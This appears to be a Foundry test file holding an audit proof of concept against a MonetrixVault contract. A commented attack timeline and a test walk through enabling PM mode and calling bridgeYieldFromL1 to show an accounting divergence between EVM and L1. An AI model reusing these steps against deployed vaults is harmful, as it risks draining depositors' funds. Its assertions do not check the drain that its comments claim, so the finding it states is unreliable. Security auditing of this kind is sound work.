// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts via harness, fund accounts, mock L1 balances
// 2. [T=0] User deposits 60,000 USDC into the vault
// 3. [T=6h] Operator bridges principal to L1 (OLP = 60k)
// 4. [T=6h] Prime distributable surplus with 10,000 USDC yield
// 5. [T=6h] Governor enables pmEnabled = true
// 6. [T=6h] Operator calls bridgeYieldFromL1. yieldShortfall() ignores PM obligations, while _sendL1Bridge includes PM suppliedBalance in l1Available.
// 7. [Assert] Verify the bridge executes and L1 is drained of PM-inflated amount, creating hidden insolvency (divergence between EVM and L1 accounting)

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);
        _mockVaultL1SpotUsdc(type(uint64).max);

        _depositAs(user1, 60_000e6);
        vm.warp(block.timestamp + 6 hours);

        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault); // bridge → OLP=60k

        _primeDistributable(10_000e6); // settle with 10k of recognized profit

        // Enable PM to trigger the state divergence
        vm.prank(governor);
        vault.setPmEnabled(true);

        assertTrue(vault.pmEnabled(), "PM should be enabled");

        uint256 shortfall = vault.yieldShortfall();
        console.log("Step 6: yieldShortfall =", shortfall);

        // The operator bridges the yield. 
        // Because pmEnabled=true, _sendL1Bridge adds PM suppliedBalance to l1Available,
        // allowing a larger bridge than what EVM-side yieldShortfall properly accounts for.
        // This drains L1 of more funds than L2 accounting tracks.
        vm.prank(operator);
        vault.bridgeYieldFromL1(shortfall);

        // Assert that the bridge executed and L1 principal/accounting is now divergent
        // The outstanding L1 principal remains unchanged for yield, but L1 spot balance was drained
        // including the PM-inflated amount, creating a hidden deficit.
        assertEq(vault.outstandingL1Principal(), 60_000e6, "OLP should remain 60k as this is yield bridge");

        // Verify the exploit: yieldShortfall was bridged despite PM obligations not being considered
        // In a real scenario, this repeated over-bridging drains L1 below PM obligations
        assertGt(shortfall, 0, "Yield shortfall should be greater than 0 to demonstrate over-bridging");
    }
}
